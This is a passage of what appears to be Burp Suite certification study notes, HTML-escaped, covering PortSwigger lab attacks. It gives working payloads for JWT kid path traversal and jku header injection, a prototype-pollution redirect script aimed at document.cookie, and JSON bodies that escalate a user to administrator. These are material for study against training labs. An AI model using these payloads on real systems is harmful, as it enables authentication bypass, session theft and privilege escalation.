\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eHashcat result provide the secret, to be used to generate a forged signing key.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key\" rel=\"nofollow\"\u003ePortSwigger JWT authentication bypass via weak signing key\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eJWT kid header\u003c/h3\u003e\u003ca id=\"user-content-jwt-kid-header\" class=\"anchor\" aria-label=\"Permalink: JWT kid header\" href=\"#jwt-kid-header\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eJWT-based mechanism for handling sessions. In order to verify the signature, the server uses the \u003ccode\u003ekid\u003c/code\u003e parameter in JWT header to fetch the relevant key from its file system.\u003cbr\u003e\nGenerate a new \u003cstrong\u003eSymmetric Key\u003c/strong\u003e and replace \u003ccode\u003ek\u003c/code\u003e property with the base64 null byte \u003ccode\u003eAA==\u003c/code\u003e, to be used when signing the JWT.\u003cbr\u003e\n\u003cstrong\u003ekid (Key ID)\u003c/strong\u003e - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eJWS\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"{\n    \u0026quot;kid\u0026quot;: \u0026quot;../../../../../../../dev/null\u0026quot;,\n    \u0026quot;alg\u0026quot;: \u0026quot;HS256\u0026quot;\n}\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e{\n    \"kid\": \"../../../../../../../dev/null\",\n    \"alg\": \"HS256\"\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePayload\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"{\n    \u0026quot;iss\u0026quot;: \u0026quot;portswigger\u0026quot;,\n    \u0026quot;sub\u0026quot;: \u0026quot;administrator\u0026quot;,\n    \u0026quot;exp\u0026quot;: 1673523674\n}\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e{\n    \"iss\": \"portswigger\",\n    \"sub\": \"administrator\",\n    \"exp\": 1673523674\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/jwt.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/jwt.png\" alt=\"jwt\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal\" rel=\"nofollow\"\u003ePortSwigger Lab: JWT authentication bypass via kid header path traversal\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eJWT arbitrary jku header\u003c/h3\u003e\u003ca id=\"user-content-jwt-arbitrary-jku-header\" class=\"anchor\" aria-label=\"Permalink: JWT arbitrary jku header\" href=\"#jwt-arbitrary-jku-header\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBurp scanner identified vulnerability stating the application appears to trust the \u003ccode\u003ejku\u003c/code\u003e header of the JWT found in the manual insertion point. It fetched a public key from an arbitrary URL provided in this header and attempted to use it to verify the signature.\u003cbr\u003e\n\u003cstrong\u003ejku (JSON Web Key Set URL)\u003c/strong\u003e - Provides a URL from which servers can fetch keys containing the correct key.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eExploit steps to Upload a malicious JWK Set, then Modify and sign the JWT:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eGenerate \u003cstrong\u003eNew RSA Key pair\u003c/strong\u003e automatically, and ignore the size.\u003c/li\u003e\n\u003cli\u003eOn the exploit server body create \u003cstrong\u003eempty JWK\u003c/strong\u003e \u003ccode\u003e{ \"keys\": [ ] }\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCopy Public Key as JWK\u003c/strong\u003e from the new RSA key pair generate in previous step, in between the exploit body square brackets \u003ccode\u003e[ paste ]\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eCopy kid value of generate RSA key into the \u003ccode\u003e/admin\u003c/code\u003e request JWT header \u003ccode\u003ekid\u003c/code\u003e value.\u003c/li\u003e\n\u003cli\u003eSet new \u003ccode\u003ejku\u003c/code\u003e parameter to the value of the exploit server URL \u003ccode\u003ehttps://exploit-server.net/exploit\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eChange JWT payload value of the \u003ccode\u003esub\u003c/code\u003e claim to \u003ccode\u003eadministrator\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eOn the \u003ccode\u003e/admin\u003c/code\u003e request in repeat, at bottom of the JSON Web Token tab, click \u003ccode\u003eSign\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eOn Sign option, then select the \u003ccode\u003eRSA signing key\u003c/code\u003e that was generated in the previous steps.\u003c/li\u003e\n\u003cli\u003eSend request, and gain access to admin portal.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/jwt-jku-header-setup.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/jwt-jku-header-setup.png\" alt=\"jwt-jku-header-setup.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe exploit server hosting the JWK public key content.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-json notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"{ \u0026quot;keys\u0026quot;: [\n{\n    \u0026quot;kty\u0026quot;: \u0026quot;RSA\u0026quot;,\n    \u0026quot;e\u0026quot;: \u0026quot;AQAB\u0026quot;,\n    \u0026quot;kid\u0026quot;: \u0026quot;3c0171bd-a8cf-45b5-839f-645fa2a57009\u0026quot;,\n    \u0026quot;n\u0026quot;: \u0026quot;749eJdyiwAYYVV    \u0026lt;snip\u0026gt;   F8tsQ_zu23DhdoePay3JlYXmza9DWDw\u0026quot;\n}\n]}\"\u003e\u003cpre\u003e{ \u003cspan class=\"pl-ent\"\u003e\"keys\"\u003c/span\u003e: [\n{\n    \u003cspan class=\"pl-ent\"\u003e\"kty\"\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eRSA\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e,\n    \u003cspan class=\"pl-ent\"\u003e\"e\"\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eAQAB\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e,\n    \u003cspan class=\"pl-ent\"\u003e\"kid\"\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e3c0171bd-a8cf-45b5-839f-645fa2a57009\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e,\n    \u003cspan class=\"pl-ent\"\u003e\"n\"\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e749eJdyiwAYYVV    \u0026lt;snip\u0026gt;   F8tsQ_zu23DhdoePay3JlYXmza9DWDw\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n}\n]}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/jwt-jku-header-exploit-server.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/jwt-jku-header-exploit-server.png\" alt=\"jwt-jku-header-exploit-server.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection\" rel=\"nofollow\"\u003ePortSwigger Lab: JWT authentication bypass via jku header injection\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eProtoType Pollution\u003c/h2\u003e\u003ca id=\"user-content-prototype-pollution\" class=\"anchor\" aria-label=\"Permalink: ProtoType Pollution\" href=\"#prototype-pollution\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAttacker add arbitrary properties to global JavaScript object prototypes, which is inherited by user-defined objects that lead to client-side DOM XSS or server-side code execution.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#client-side-proto\"\u003eClient-Side Proto\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#server-side-proto\"\u003eServer-Side Proto\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution\" rel=\"nofollow\"\u003eDom Invader Enable Prototype Pollution\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eClient-Side Proto\u003c/h3\u003e\u003ca id=\"user-content-client-side-proto\" class=\"anchor\" aria-label=\"Permalink: Client-Side Proto\" href=\"#client-side-proto\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eA target is vulnerable to DOM XSS via client side prototype pollution. \u003cstrong\u003e\u003ca href=\"#dom-invader\"\u003eDOM Invader\u003c/a\u003e\u003c/strong\u003e will \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the gadget and using a hosted payload to performing phishing directed at the victim and steal their cookie.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eExploit server Body section, host an exploit that will navigate the victim to a malicious URL.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;\n    location=\u0026quot;https://TARGET.NET/#__proto__[hitCallback]=alert%28document.cookie%29\u0026quot;\n\u0026lt;/script\u0026gt;  \"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-s1\"\u003elocation\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"https://TARGET.NET/#__proto__[hitCallback]=alert%28document.cookie%29\"\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e  \u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/proto-pollution.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/proto-pollution.png\" alt=\"Proto pollution\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAbove image show the \u003cstrong\u003eDeliver to Victim\u003c/strong\u003e phishing request being send.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries\" rel=\"nofollow\"\u003ePortSwigger Lab: Client-side prototype pollution in third-party libraries\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/proto-pollution.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/proto-pollution.png\" alt=\"Proto pollution\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eServer-Side Proto\u003c/h3\u003e\u003ca id=\"user-content-server-side-proto\" class=\"anchor\" aria-label=\"Permalink: Server-Side Proto\" href=\"#server-side-proto\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTo \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e Proto pollution, insert the follow into a JSON post request when updating a user profile information authenticated as low privileged role.\u003cbr\u003e\nSee instruction video by \u003ca href=\"https://youtu.be/oYAxbRiB0Jk\" rel=\"nofollow\"\u003eTrevor TJCHacking\u003c/a\u003e about PrivEsc via server-side prototype pollution.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-json notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026quot;__proto__\u0026quot;: {\n    \u0026quot;foo\u0026quot;:\u0026quot;bar\u0026quot;\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-ent\"\u003e\"__proto__\"\u003c/span\u003e: {\n    \u003cspan class=\"pl-ent\"\u003e\"foo\"\u003c/span\u003e:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ebar\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify__proto__.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify__proto__.png\" alt=\"identify proto\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eObserve the \u003ccode\u003eisAdmin\u003c/code\u003e property and resend the POST update account with the \u003ccode\u003e__proto__\u003c/code\u003e payload below to elevate our access role to Administrator.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-json notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026quot;__proto__\u0026quot;: {\n    \u0026quot;isAdmin\u0026quot;:true\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-ent\"\u003e\"__proto__\"\u003c/span\u003e: {\n    \u003cspan class=\"pl-ent\"\u003e\"isAdmin\"\u003c/span\u003e:\u003cspan class=\"pl-c1\"\u003etrue\u003c/span\u003e\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution\" rel=\"nofollow\"\u003ePortSwigger Lab: Privilege escalation via server-side prototype pollution\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eAPI Testing\u003c/h2\u003e\u003ca id=\"user-content-api-testing\" class=\"anchor\" aria-label=\"Permalink: API Testing\" href=\"#api-testing\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#exploiting-a-mass-assignment\"\u003eExploiting a mass assignment\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#api-reset-password-parameter-pollution\"\u003eAPI Reset Password Parameter Pollution\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eExploiting a mass assignment\u003c/h3\u003e\u003ca id=\"user-content-exploiting-a-mass-assignment\" class=\"anchor\" aria-label=\"Permalink: Exploiting a mass assignment\" href=\"#exploiting-a-mass-assignment\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAPI performing GET request and directly after a POST request and in the POST request notice additional JSON parameters in the body of response, indicate hidden parameter fields.\nAdd hidden fields such as \u003ccode\u003e{\"admin\":true}\u003c/code\u003e can elevate access to higher privileged users or gain sensitive information about user.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn below lab exercise the ecommerce site have a discount parameter and adding it with value of 100 allow for the product to be free on checkout.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/mass-assignment-hidden-parameter.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/mass-assignment-hidden-parameter.png\" alt=\"Mass assignment hidden parameter\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePrivilege escalation using API endpoints hidden parameters in POST or PATCH HTTP verb request.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-json notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"{\n    \u0026quot;username\u0026quot;: \u0026quot;carlos\u0026quot;,\n    \u0026quot;email\u0026quot;: \u0026quot;carlos@exploit.com\u0026quot;,\n    \u0026quot;isAdminLevel\u0026quot;: true\n}\"\u003e\u003cpre\u003e{\n    \u003cspan class=\"pl-ent\"\u003e\"username\"\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ecarlos\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e,\n    \u003cspan class=\"pl-ent\"\u003e\"email\"\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ecarlos@exploit.com\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e,\n    \u003cspan class=\"pl-ent\"\u003e\"isAdminLevel\"\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003etrue\u003c/span\u003e\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting a mass assignment vulnerability\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eAPI Reset Password Parameter Pollution\u003c/h3\u003e\u003ca id=\"user-content-api-reset-password-parameter-pollution\" class=\"anchor\" aria-label=\"Permalink: API Reset Password Parameter Pollution\" href=\"#api-reset-password-parameter-pollution\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNotice the reset password API function uses parameter in POST body for username. To \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e aditional hidden parameters for the API function insert random parameter \u003ccode\u003e\u0026amp;x=y\u003c/code\u003e to observe error 